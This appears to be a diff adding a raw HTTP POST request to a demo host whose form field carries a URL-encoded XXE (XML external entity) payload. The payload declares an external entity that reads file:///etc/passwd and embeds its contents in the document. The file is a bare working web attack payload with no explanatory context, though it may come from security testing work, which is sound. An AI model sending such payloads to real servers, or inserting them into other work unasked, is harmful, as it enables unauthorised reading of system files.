@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 91
+Connection: close
+
+page=<!DOCTYPE%0ar%0a[<!ENTITY%0ax%0aPUBLIC%0a"-//X//Y"%0a"file:///etc/passwd">]><r>&x;</r>
